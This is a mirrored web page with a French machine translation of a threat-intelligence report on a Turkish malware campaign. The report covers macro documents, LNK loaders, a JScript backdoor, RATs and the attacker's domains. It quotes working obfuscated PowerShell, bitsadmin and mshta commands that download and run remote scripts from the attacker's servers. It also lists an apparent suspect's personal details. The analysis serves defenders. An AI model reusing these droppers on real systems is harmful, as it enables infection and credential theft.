<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üå≠ üç∞ ü¶Ö Astuces turques avec des vers, des rats ... et un pigiste üë©üèΩ‚Äçü§ù‚Äçüë©üèª üìå üë®üèº‚Äç‚öïÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Des sp√©cialistes du groupe de recherche sur les menaces du Positive Technologies Security Center (PT Expert Security Center) ont d√©couvert une campagn...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Astuces turques avec des vers, des rats ... et un pigiste</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/479998/">  Des sp√©cialistes du groupe de recherche sur les menaces du <a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">Positive Technologies Security Center (PT Expert Security Center) ont</a> d√©couvert une campagne malveillante active depuis au moins la mi-janvier 2018.  L'op√©ration est destin√©e aux utilisateurs du Br√©sil, du Royaume-Uni, de Hongrie, d'Allemagne, de Lettonie, des √âtats-Unis, de Turquie et des Philippines.  Divers outils et techniques sont utilis√©s pour infecter et contr√¥ler le PC de la victime.  Ce rapport d√©taille le stade de l'infection, les utilitaires utilis√©s, les caract√©ristiques d'organisation de l'infrastructure r√©seau, ainsi que les traces num√©riques qui nous ont conduit √† devenir candidat hacker. <br><br><h2>  R√©sum√© </h2><br><ul><li>  Les attaquants ont trait√© le ver il y a 10 ans, en tenant compte des techniques modernes </li><li>  Le zoo d'outils utilis√© en conjonction avec une infrastructure r√©seau √©tendue </li><li>  Le principal suspect est un pigiste turc </li></ul><a name="habracut"></a><br><h2>  Livraison de la charge utile </h2><br><h3>  Documents de bureau </h3><br>  Le 5 avril 2019, dans le cadre du suivi des nouvelles menaces, les sp√©cialistes de PT Expert Security Center ont d√©couvert un document de bureau suspect.  Fichier avec l'extension .docm (document MS Word d'un nouvel exemple avec prise en charge des macros): <br><br><ul><li>  cr√©√© quelques jours avant la d√©couverte (2019-03-31), </li><li>  contient une image pour convaincre l'utilisateur d'activer les macros, </li><li>  a √©t√© cr√©√© sur un syst√®me avec la langue turque (cela est d√©montr√© par les valeurs des champs de m√©tadonn√©es: "Konu Ba≈ülƒ±ƒüƒ±" - "Titre du sujet", "Konu Ba l, 1" - "Sujet, 1"; traduction Google Translate). </li></ul><br><img src="https://habrastorage.org/webt/vu/vp/fj/vuvpfjfs9iissnmjcse2lyndlmk.png"><br><br>  <i>Fig.</i>  <i>1. Pi√®ge de notification de macro typique</i> <br><br>  Le code de macro est un peu obscurci, mais laconique: √† l'aide de l'applet de commande Background Intelligent Transfer Management (BITS) pour PowerShell, il t√©l√©charge et ex√©cute un script en JScript √† partir du serveur d'un attaquant: <br><br><pre><code class="javascript hljs">Shell (<span class="hljs-string"><span class="hljs-string">"pow"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ershe"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ll -comm"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"and "</span></span><span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'"</span></span><span class="hljs-string"><span class="hljs-string">""</span></span>)</code> </pre> <br>  L'utilisation de PowerShell et d'un module atypique pour t√©l√©charger des fichiers √† partir d'un serveur Web est due √† une tentative de contourner les restrictions sur le lancement et l'ex√©cution de programmes non approuv√©s. <br><br>  Il existe plusieurs documents similaires.  Par exemple, l'un d'eux est un fichier .doc (un document MS Word √† l'ancienne) avec une page de codes de caract√®res en turc.  Le travail macro est √©galement tr√®s similaire: <br><br><pre> <code class="javascript hljs">Shell <span class="hljs-string"><span class="hljs-string">"cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js &amp; wscript.exe %temp%\o2.js"</span></span>, vbHide</code> </pre> <br>  Dans ce cas, l'auteur utilise la m√™me technologie BITS, mais avec l'aide de l'utilitaire syst√®me l√©gitime bitsadmin.  Fait int√©ressant, la date √† laquelle le document a √©t√© cr√©√© et l'heure √† laquelle il a √©t√© d√©couvert dans des sources publiques nous envoient √† la mi-juillet 2018.  Ainsi, les attaques sont pertinentes pendant au moins environ un an.  De plus, le m√™me serveur attaquant est utilis√© pour t√©l√©charger la charge utile;  l'approche pour nommer un script chargeable en JScript est similaire. <br><br>  Un autre document a l'extension .rtf (Rich Text Format).  Il contient plusieurs documents .xls (ancien document MS Excel) avec le m√™me contenu.  Le code de macro est compl√®tement identique √† celui extrait du document d'origine, et la co√Øncidence des valeurs de la page de codes et du champ XML HeadingPairs conduit √† la m√™me paternit√©. <br><br><h3>  Raccourcis LNK </h3><br>  Il convient de noter que dans cette campagne, non seulement les documents de bureau ont √©t√© utilis√©s comme stade initial de l'infection.  Nous avons rencontr√© quelques fichiers .lnk malveillants (Windows Shell Link), qui, lorsqu'ils √©taient lanc√©s, ex√©cutaient la commande suivante: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /c powershell -command <span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')"</span></span> &amp; %systemroot%\system32\wscript %temp%\bb.js</code> </pre> <br>  Les √©tiquettes ont √©t√© distribu√©es √† la mi-mars et √† la fin avril 2019. <br><br>  Les m√©tadonn√©es de raccourci contiennent le nom d'utilisateur win7-bilgisayar (du turc ¬´ordinateur win7¬ª) - l'utilisateur du syst√®me sur lequel elles ont √©t√© cr√©√©es. <br><br>  Nous pouvons supposer en toute s√©curit√© que les e-mails de phishing sont le sc√©nario le plus probable pour livrer des fichiers malveillants au premier stade de l'infection. <br><br><h2>  M√©tamorphoses de Houdini </h2><br>  Tous les objets examin√©s de la premi√®re √©tape de l'infection t√©l√©chargent et ex√©cutent le m√™me script en JScript (sans tenir compte des diff√©rences mineures).  Le fichier n'est pas obscurci et n'est pas empaquet√©, et la seule chose qui a √©t√© faite pour compliquer l'analyse est des noms de variables al√©atoires.  Il s'agit d'une porte d√©rob√©e sur la plate-forme WSH.  Parmi les caract√©ristiques de son travail, on peut distinguer les suivantes: <br><br><ul><li>  L'adresse d'h√¥te et le port du serveur de gestion sont prot√©g√©s dans un script </li><li>  L'interaction avec C&amp;C est r√©alis√©e au moyen de requ√™tes POST du protocole HTTP. </li><li>  Au moment du d√©but des travaux, la cha√Æne ¬´is-bekle¬ª est ins√©r√©e dans le champ URI, traduit du turc par ¬´is-ready¬ª. </li><li>  Le champ User-Agent contient de br√®ves informations sur le syst√®me avec le d√©limiteur sp√©cifi√© (dans ce cas, "&lt;|&gt;"): <br><ul><li>  Le num√©ro de s√©rie du disque dur </li><li>  nom d'utilisateur </li><li>  version du syst√®me </li><li>  nom du script </li><li>  nom de l'antivirus </li><li>  valeur de la variable d'environnement% ProgramData%, </li><li>  la pr√©sence de .Net FrameWork 4.5.2 dans le syst√®me, </li><li>  d√©lai d'attente entre les demandes, </li><li>  Java dans le syst√®me. </li></ul><br></li><li>  <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">V√©rifie l'</a> environnement du sujet du bac √† sable de Kaspersky Lab par le num√©ro de s√©rie donn√© du disque dur.  En cas de co√Øncidence, il cesse de fonctionner. </li><li>  Il re√ßoit du serveur et ex√©cute les commandes donn√©es;  En voici quelques uns: <br><ul><li>  t√©l√©charger un fichier depuis le serveur, </li><li>  t√©l√©charger le fichier sur le serveur </li><li>  collecte du contenu du presse-papiers, </li><li>  collecte du contenu du catalogue, </li><li>  collecte d'informations sur les processus, </li><li>  ex√©cution de commandes dans l'interpr√©teur cmd.exe, </li><li>  prendre et envoyer une capture d'√©cran, </li><li>  R√©cup√©rez et soumettez des bases de donn√©es Chrome et Opera avec des mots de passe. </li></ul><br></li></ul><br><img src="https://habrastorage.org/webt/ky/xj/ur/kyxjurbcxvvpazharap_hq6fh68.png"><br>  <i>Fig.</i>  <i>2. Le d√©but du script charg√© en JScript depuis le serveur attaquant</i> <br><br>  Par la pr√©sence de commentaires, la structure du code, les noms de commandes utilis√©s et le format de collecte des informations sur le syst√®me, on peut √©tablir un parall√®le avec le ver VBS bien connu Houdini.  En 2013, nos coll√®gues de FireEye ont fourni une <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">analyse</a> d√©taill√©e <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">des</a> fonctions de ce cheval de Troie, du traitement des commandes et de la collecte d'informations dans lesquelles elles se produisent de mani√®re similaire.  Il semble que dans notre cas, l'attaquant a pris comme base le mod√®le du ver bien connu, r√©√©crit les fonctions non pas en VBScript, mais en JScript, et a remplac√© certaines lignes anglaises par des lignes turques. <br><br><img src="https://habrastorage.org/webt/z4/52/2t/z4522tdmc-74q3wrlsz_op7tqki.png"><br><br>  <i>Fig.</i>  <i>3. Traitement des commandes de porte d√©rob√©e JScript</i> <br><br>  Il convient de noter qu'en tant que marqueur des r√©sultats de l'ex√©cution de la commande, des cha√Ænes contenant la sous-cha√Æne ¬´Bcorp¬ª sont utilis√©es.  Il est √©galement pr√©sent au nom du serveur de gestion ip1 [.] Bcorp.fun. <br><br><h3>  Sur un serveur attaquant </h3><br>  Selon Shodan, au 30 avril 2019, un attaquant h√©bergeait un serveur Web bas√© sur <a href="https://www.appserv.org/en/">AppServ</a> .  Il ne semble pas que le serveur ait √©t√© soigneusement configur√©: par exemple, la page phpinfo est disponible, ce qui r√©v√®le des informations de configuration int√©ressantes.  Lors de l'analyse des liens Web √† partir desquels le logiciel malveillant a √©t√© t√©l√©charg√©, il s'est av√©r√© que le serveur disposait d'un r√©pertoire ouvert (r√©pertoire ./a) r√©pertoriant les outils des autres attaquants. <br><br><img src="https://habrastorage.org/webt/ti/rg/ms/tirgmslrqtgw3epiumyzv0yrag0.png"><br><br>  <i>Fig.</i>  <i>4. Page d'accueil du serveur attaquant</i> <br><br><img src="https://habrastorage.org/webt/cq/-d/g1/cq-dg1v3yxrbqgprtstzphvyogm.png"><br><br>  <i>Fig.</i>  <i>5. page phpinfo sur le serveur attaquant</i> <br><br><img src="https://habrastorage.org/webt/xc/cy/hj/xccyhjiblf6w1xkmzj51prgol-0.png"><br><br>  <i>Fig.</i>  <i>6. Liste du r√©pertoire ouvert du serveur attaquant fin avril 2019</i> <br><br><img src="https://habrastorage.org/webt/ji/zs/r0/jizsr0d3hrbqout2mrth5hfq794.png"><br><br>  <i>Fig.</i>  <i>7. Liste du r√©pertoire ouvert du serveur attaquant fin mai 2019</i> <br><br>  Vous trouverez ci-dessous une description des fichiers d√©tect√©s. <br><br><h3>  Houdini jscript </h3><br>  Tout d'abord, nous avons re√ßu de nombreuses variantes du ver Houdini modifi√©, discut√©es ci-dessus.  De version en version, le script a subi des changements mineurs: les noms d'h√¥te (husan2.ddns.net, ip1.bcorp.fun, ip1.qqww.eu), les ports (86, 87), les noms de variables, les commandes individuelles sont apparus ou ont disparu.  Une version a m√™me √©t√© encadr√©e comme un scriptlet en JScript. <br><br><img src="https://habrastorage.org/webt/vp/7v/se/vp7vsedyr71hixfb31ffenjzdg4.png"><br><br>  <i>Fig.</i>  <i>8. Houdini JScript en tant que scriptlet</i> <br><br><h3>  Pot Bcorp </h3><br>  Porte d√©rob√©e Java auto-fabriqu√©e.  Il interagit avec C&amp;C sur TCP sur le port 22122. Il peut: <br><br><ul><li>  ex√©cuter des commandes dans l'interpr√©teur cmd.exe, </li><li>  d√©terminer la version du syst√®me </li><li>  R√©pertorier les r√©pertoires </li><li>  t√©l√©charger des fichiers </li><li>  inscrivez-vous dans le r√©pertoire de d√©marrage et dans la branche de d√©marrage du registre. </li></ul><br>  Il semble que c'est exactement la raison pour laquelle le ver modifi√© v√©rifie Java dans le syst√®me.  Dans le m√™me temps, il n'est pas clair pourquoi utiliser une porte d√©rob√©e suppl√©mentaire, car celle d'origine a un ensemble de fonctions suffisant. <br><br><h3>  Get-chromecreds </h3><br>  <a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">Wrapper PowerShell</a> pour extraire l'historique, les connexions, les mots de passe et les cookies du navigateur Chrome.  Certaines versions contiennent la biblioth√®que auxiliaire System.Data.SQLite.dll pour les syst√®mes x86 et x64 sous forme cod√©e en base64, tandis que d'autres supposent sa pr√©sence dans le r√©pertoire% APPDATA%.  Le composant est fourni en tant que plug-in auxiliaire pour la porte d√©rob√©e JScript principale. <br><br><h3>  Start-keylogger </h3><br>  <a href="">Impl√©mentation PowerShell d'un</a> enregistreur de frappe simple.  Le composant est fourni en tant que plug-in auxiliaire pour la porte d√©rob√©e JScript principale. <br><br><img src="https://habrastorage.org/webt/lv/z9/hu/lvz9huoub4btquoi2gbiwd8ipsg.png"><br><br>  <i>Fig.</i>  <i>9. Extrait de code PowerShell Keylogger</i> <br><br><h3>  WebBrowserPassView </h3><br>  <a href="https://www.nirsoft.net/utils/web_browser_password.html">Un utilitaire</a> de Nirsoft pour obtenir les connexions et les mots de passe des navigateurs populaires.  Les attaquants ont utilis√© la version de l'auteur, apr√®s l'avoir emball√©e avec ASPack pour compliquer l'analyse ou contourner la d√©tection par des indicateurs. <br><br><h3>  NetWire RAT </h3><br>  Un <a href="https://ultrahacks.org/shop/product/netwire-rat/">outil</a> commercial accessible au public pour le contr√¥le √† distance d'un PC.  Utilis√© par divers groupes cybercriminels.  Les d√©veloppeurs de logiciels malveillants ont compliqu√© l'analyse et la d√©couverte en int√©grant RAT dans PE sur la plate-forme .NET et en utilisant l'obscurcisseur de code DeepSea 4.1. <br><br><h3>  √âcoute TCP </h3><br>  Un <a href="https://www.allscoop.com/tcp-listen.php">utilitaire GUI</a> simple d'AllScoop pour tester les param√®tres d'un routeur ou d'un pare-feu.  Chaque port d'√©coute r√©pond avec une cha√Æne donn√©e, mettant fin √† la connexion. <br><br><img src="https://habrastorage.org/webt/ud/cr/k-/udcrk-bohjearwqg5thpcia9-ym.png"><br><br>  <i>Fig.</i>  <i>10. Interface graphique de l'utilitaire TCP Listen</i> <br><br><h3>  Chargeur Lnk </h3><br>  Chargeur de raccourcis, similaire √† ceux d√©j√† consid√©r√©s pr√©c√©demment.  Au d√©marrage, ex√©cute la commande suivante: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /v /c <span class="hljs-string"><span class="hljs-string">"set i=h&amp;&amp;ms!i!ta http://ip1.qqww.eu/1/f.htm"</span></span></code> </pre> <br>  Cette fois, le raccourci a √©t√© cr√©√© sous un autre utilisateur (desktop-amkd3n3). <br><br><h3>  Chargeurs de script </h3><br>  Dans ce groupe, nous avons combin√© les diff√©rents bootloaders du RAT ci-dessus.  Tous sont petits (jusqu'√† 1 Ko), dans diff√©rents formats (.htm, .xsl, .hta, etc.), le code est ex√©cut√© dans plusieurs langages de script (JScript, PowerShell) et compil√© √† la vol√©e C #.  Vous trouverez ci-dessous des extraits de code de certains exemples: <br><br><img src="https://habrastorage.org/webt/ga/dk/mj/gadkmjw2x2s7i9br6wvigjbduho.png"><br><br>  <i>Fig.</i>  <i>11. Fragment du chargeur .htm</i> <br><br><img src="https://habrastorage.org/webt/ta/du/fk/tadufk1tskw_mu33lyhp9o2uieg.png"><br><br>  <i>Fig.</i>  <i>12. Fragment du chargeur de d√©marrage .xsl</i> <br><br><img src="https://habrastorage.org/webt/5o/qi/nn/5oqinngzwzjeqgcg_pvv1c7vsgo.png"><br><br>  <i>Fig.</i>  <i>13. Fragment du chargeur de d√©marrage .ps1</i> <br><br><h3>  Petits chargeurs PE </h3><br>  En plus des chargeurs de script, des fichiers PE sur la plate-forme .NET ont √©t√© d√©couverts.  Ils sont √©galement petits (jusqu'√† 10 Ko), avec des fonctionnalit√©s capacitives similaires: <br><br><img src="https://habrastorage.org/webt/gi/vo/lc/givolcsz3joqwnt0zqtq8ftqzui.png"><br><br>  <i>Fig.</i>  <i>14. Un exemple de code d√©compil√© de l'un des chargeurs PE</i> <br><br><h3>  xRAT </h3><br>  Un projet accessible au public et distribu√© gratuitement pour la gestion √† distance de PC.  Diverses versions et modifications sont r√©pandues.  √âcrit en C #, partiellement obscurci. <br><br><h3>  Panneau Bcorp contre  constructeur </h3><br>  La partie serveur de contr√¥le pour la porte d√©rob√©e JScript.  En m√™me temps, c'est le concepteur de la partie client.  Repr√©sente PE sur la plate-forme .NET.  Non obscurci, non emball√©.  L'interface ressemble √† une partie serveur repens√©e pour le ver VBS Houdini d√©j√† mentionn√©.  En plus d'envoyer des commandes, il t√©l√©charge des composants et des plugins suppl√©mentaires d√©crits pr√©c√©demment sur la machine infect√©e: environnement Java, scripts PowerShell et un utilitaire de Nirsoft pour collecter des informations √† partir des navigateurs, scripts PowerShell pour intercepter les frappes de touches, etc. Il est curieux que le projet s'appelle BcorpRat , qui peut √™tre vu dans le titre de la fen√™tre dans les images ci-dessous.  Et au nom de l'espace de noms du code source se trouve la ligne ¬´Btech¬ª, sur laquelle nous reviendrons plus loin. <br><br><img src="https://habrastorage.org/webt/m3/ix/63/m3ix63sjf1-fe3rawasy_jmhldk.png"><br><br>  <i>Fig.</i>  <i>15. Panneau de commande de porte d√©rob√©e JScript, fen√™tre principale</i> <br><br><img src="https://habrastorage.org/webt/ob/qq/8g/obqq8gb4arhzlfjowoxato5v3yu.png"><br><br>  <i>Fig.</i>  <i>16. Le panneau de contr√¥le JScript-backdoor, la fen√™tre du concepteur de la partie client</i> <br><br><h2>  Infrastructure r√©seau </h2><br>  Ensuite, nous effectuerons une analyse plus d√©taill√©e des adresses avec lesquelles ces programmes malveillants ou d'autres de l'attaquant ont interagi.  Commen√ßons par le domaine definebilimi.com, accessible par les documents bureautiques et les chargeurs de raccourcis. <br><br><h3>  definebilimi.com </h3><br>  Le 16 janvier 2018, ce domaine a un nouveau propri√©taire.  Soit dit en passant, ¬´d√©finir bilimi¬ª est litt√©ralement traduit du turc comme ¬´un tr√©sor de la science¬ª.  Vous trouverez ci-dessous les donn√©es les plus int√©ressantes de l'historique des enregistrements WHOIS √† cette √©poque. <br>  Tableau 1. Informations sur le titulaire (propri√©taire) du domaine definebilimi.com <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nom de l'enregistrement </th><th>  Valeur d'enregistrement </th></tr><tr><td>  Nom du titulaire </td><td>  Koray Yaman </td></tr><tr><td>  Rue du titulaire </td><td>  123456 </td></tr><tr><td>  Ville d√©clarante </td><td>  Istanbul </td></tr><tr><td>  Pays d√©clarant </td><td>  TR </td></tr><tr><td>  T√©l√©phone du titulaire </td><td>  +90.5350167352 </td></tr><tr><td>  Courriel du titulaire </td><td>  btech@hotmail.com.tr </td></tr></tbody></table></div><br>  Il sera t√©m√©raire de pr√©tendre que les donn√©es sont authentiques.  Le pays indiqu√© et la fr√©quence d'apparition de traces de la langue turque dans le code nous permettent de supposer que ces co√Øncidences ne sont pas accidentelles.  Et l'adresse e-mail contient la sous-cha√Æne "btech", √† laquelle nous avons d√©j√† pr√™t√© attention. <br><br>  L'historique des modifications apport√©es aux serveurs NS qui ont fourni des informations sur le domaine enregistr√© semble int√©ressant: <br><br><div class="scrollable-table"><table><tbody><tr><th>  Date </th><th>  Action </th><th>  Serveur </th></tr><tr><td>  17/03/2018 </td><td>  Nouvelle entr√©e </td><td>  buhar.biz </td></tr><tr><td>  15/01/2019 </td><td>  Changement record </td><td>  definebilimi.com </td></tr><tr><td>  06/04/2019 </td><td>  Changement record </td><td>  qqww.eu </td></tr></tbody></table></div><br>  <i>Tableau 2. Historique des serveurs NS pour le domaine definebilimi.com</i> <br><br>  Les h√¥tes buhar.biz et qqww.eu ont d√©j√† √©t√© rencontr√©s pr√©c√©demment dans des logiciels malveillants. <br><br><h3>  buhar.us </h3><br>  La nouvelle histoire de ce domaine (¬´buhar¬ª du turc - ¬´couples¬ª) commence le m√™me jour que l'histoire de definebilimi.com - 16 janvier 2018. <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nom de l'enregistrement </th><th>  Valeur d'enregistrement </th></tr><tr><td>  Nom du titulaire </td><td>  balta zar </td></tr><tr><td>  Organisation d√©clarante </td><td>  Buharus </td></tr><tr><td>  Rue du titulaire </td><td>  Gizli </td></tr><tr><td>  Ville d√©clarante </td><td>  Gizli </td></tr><tr><td>  Pays d√©clarant </td><td>  TR </td></tr><tr><td>  T√©l√©phone du titulaire </td><td>  +1.123456789 </td></tr><tr><td>  Courriel du titulaire </td><td>  buharcin@yandex.com </td></tr></tbody></table></div><br>  <i>Tableau 3. Informations sur le titulaire (propri√©taire) du domaine buhar.us</i> <br><br>  La situation est similaire: encore une fois, certaines donn√©es semblent fausses √† l'exception de l'adresse postale (¬´buharcin¬ª du turc - ¬´locomotive¬ª). <br><br><h3>  bcorp.fun </h3><br>  Le domaine est enregistr√© depuis le 23 mars 2019.  En plus du fait que la Turquie est √† nouveau enregistr√©e en tant que pays, Bcorp est r√©pertori√©e comme organisation cliente.  En fait, nous voyons la m√™me chose dans le nom de domaine lui-m√™me, comme dans plusieurs paragraphes pr√©c√©dents. <br><br><h3>  husan2.ddns.net </h3><br>  Il est curieux que l'attaquant acqui√®re des h√¥tes non seulement de mani√®re classique.  Depuis la mi-mars 2019, l'utilisation de serveurs DNS dits dynamiques est enregistr√©e.  La technologie permet aux attaquants de masquer efficacement leurs adresses IP et d'assurer la vitalit√© de leurs centres de contr√¥le.  Il convient de noter une certaine pr√©visibilit√© dans le choix des noms: par exemple, apr√®s quelques mois, l'utilisation du domaine husan3.ddns.net a √©t√© d√©couverte, mais l'activit√© du domaine husan.ddns.net remonte √† avril 2017. <br><br><h3>  bkorp.xyz </h3><br>  Depuis d√©but avril, le pirate, poursuivant son chemin sur le chemin de l'anonymisation, enregistre les domaines √† l'aide du service WhoisGuard, Inc., situ√© au Panama;  bkorp.xyz, prntsrcn.com et i37-imgur.com ne sont que quelques exemples.  Les serveurs NS utilis√©s les relient toujours √† d'autres domaines malveillants. <br><br><h3>  qqww.eu </h3><br>  En plus du fait que ce domaine, comme le domaine bcorp.fun, poss√®de un sous-domaine ip1, il y a un autre d√©tail important.  Les informations sur le d√©clarant indiquent l'organisation Osbil Technology Ltd., pr√©tendument situ√©e √† Berlin.  En fait, l'organisation du m√™me nom est situ√©e sur la c√¥te de Chypre dans la ville de Famagouste - sur le territoire de la R√©publique turque partiellement reconnue de Chypre du Nord.  Et le site <a href="https://www.yoncu.com/">officiel de la</a> soci√©t√© est situ√© sur le domaine, qui √©tait le serveur NS du domaine bcorp.fun de mars √† mai 2019.  Nous n'avons trouv√© aucun signe de compromis sur le serveur de noms, et les fonctionnalit√©s d'infrastructure du fournisseur NS (remplacement du client par les donn√©es du fournisseur dans la colonne des inscrits) ont permis de masquer les informations client du public. <br><br><img src="https://habrastorage.org/webt/7s/zz/q2/7szzq2mjgkuppmdvnpd_xdrk41c.png"><br><br>  <i>Fig.</i>  <i>17. Informations sur le titulaire (propri√©taire) du domaine qqww.eu</i> <br><br><h3>  Adresses IP </h3><br>  Pour √™tre complet, voici les adresses IP - avec certains domaines qui leur correspondent √† diff√©rents intervalles de temps: <br><ul><li>  5.255.63.12 <br><ul><li>  bcorp.fun </li><li>  husan.ddns.net </li><li>  husan2.ddns.net </li><li>  husan3.ddns.net </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.137 <br><ul><li>  bcorp.fun </li><li>  bkorp.xyz </li><li>  definebilimi.com </li><li>  i36-imgur.com </li><li>  i37-imgur.com </li><li>  i38-imgur.com </li><li>  i39-imgur.com </li><li>  prntsrcn.com </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.140 <br><ul><li>  bkorp.xyz </li><li>  buhar.us </li></ul><br><h2>  Dans le sillage du pirate </h2><br>  Parmi les outils malveillants et auxiliaires, une image curieuse a √©t√© trouv√©e sur le serveur de l'attaquant: <br><br><img src="https://habrastorage.org/webt/c9/pi/gf/c9pigfzw8s36wno_idj18gwv57u.png"><br><br>  <i>Fig.</i>  <i>18. L'image dans le r√©pertoire sur l'h√©bergement de l'attaquant</i> <br><br>  Nous n'avons pas r√©duit la r√©solution de l'image, mais l'avons plac√©e ici sous la forme qu'elle √©tait sur l'h√¥te. <br><br>  Malgr√© la faible qualit√© d'image, nous avons pu √©tablir qu'il s'agit d'une capture d'√©cran d'une page sur une transaction termin√©e avec une crypto-monnaie sur la ressource blockr.io.  Cela n'a pas fonctionn√©, nous avons donc essay√© de trouver tout ce qui concernait le nom IMG_JPEG-0371e4dce3c8804f1543c3f0f309cc11.jpg avec lequel l'image √©tait stock√©e par le pirate.  Les traces ont conduit au r√©sultat du <a href="https://www.hybrid-analysis.com/sample/9f1f04db605ba35a97c1a0554c1932f5848c9bb7a4cb915cde670b0bb26dc7b6%3FenvironmentId%3D100">traitement</a> sur un analyseur en ligne d'un fichier dont le nom co√Øncidait avec le nom de notre image.  L'objet trait√© est un raccourci Windows, similaire √† ceux que nous avons d√©j√† examin√©s pr√©c√©demment.  Une photo lui √©tait attach√©e avec une photographie de la carte d'identit√© d'un citoyen turc, dont le nom de famille co√Øncide avec le nom de famille qui a √©t√© indiqu√© lors de l'enregistrement du domaine - Yaman. <br><br><img src="https://habrastorage.org/webt/pr/b7/ca/prb7cacgvurge0qqdt3tqnbthxe.png"><br><br>  <i>Fig.</i>  <i>19. Carte d'identit√© avec chargeur de d√©marrage</i> <br><br>  Le traitement du raccourci dans le bac √† sable en ligne ne s'est pas produit √† la suite du t√©l√©chargement du fichier par l'utilisateur, mais en transmettant l'URL √† partir de laquelle il √©tait n√©cessaire de t√©l√©charger et de traiter l'objet: <br><br> <code>hxxps://github.com/btechim/prntsrcn/blob/nm46ny/IMG-0371e4dce3c8804f1543c3f0f309cc11.jpg.lnk?raw=true</code> <br> <br>  Le compte github de l'utilisateur est d√©j√† bloqu√©, cependant, en utilisant le lien, nous pouvons d√©finir le pseudo de l'utilisateur (btechim) et le nom du projet (prntsrcn).  Le nom du projet co√Øncide avec le nom de l'un des domaines trouv√©s dans la campagne (prntsrcn.com), et le surnom de l'utilisateur contient la sous-cha√Æne btech, qui appara√Æt dans le code de programme des panneaux d'administration mentionn√©s ci-dessus. <br><br>  La recherche du surnom d'un utilisateur nous a conduits √† une ressource ind√©pendante sur laquelle se trouve la <a href="https://www.freelancer.com/u/btechim">page</a> d'un utilisateur de Turquie - avec le m√™me surnom, avec un num√©ro de t√©l√©phone confirm√©, une adresse postale et un profil Facebook - offrant ses services dans le d√©veloppement de logiciels dans le domaine de la cybers√©curit√©. <br><br><img src="https://habrastorage.org/webt/cf/f2/y0/cff2y0moihsk3fy6abo_wu2489c.png"><br><br>  <i>Fig.</i>  <i>20. La page de l'attaquant pr√©sum√© sur la ressource pour les pigistes</i> <br><br><h2>  Conclusions </h2><br>  Pendant plusieurs mois, les experts de Positive Technologies ont suivi le d√©veloppement d'une campagne malveillante d'origine turque et transf√©r√© les donn√©es accumul√©es au CERT Turquie.  Il est loin d'√™tre fr√©quent qu'au cours d'une s√©rie d'attaques, l'utilisation de techniques modernes et d'outils recycl√©s il y a 10 ans soit combin√©e.  L'attaquant a utilis√© une vari√©t√© d'outils (par objectif, par plate-forme, par niveau de difficult√©) pour obtenir un contr√¥le complet sur le PC cible.  Il convient de noter la variabilit√© des approches dans la pr√©paration de l'infrastructure r√©seau dans les tentatives de cacher leur identit√©.  Cependant, une fois encore, tout n'a pas √©t√© pris en compte, l'arrogance et plusieurs omissions ont √©t√© prononc√©es par le d√©linquant.  L'√©tude a √©t√© renvoy√©e au Centre turc de r√©ponse aux incidents de s√©curit√© de l'information. <br><br><div class="spoiler">  <b class="spoiler_title">CIO</b> <div class="spoiler_text">  Chargeurs de bureau: <br>  3305720da73efbcb7d25edbb7eff5a1a <br>  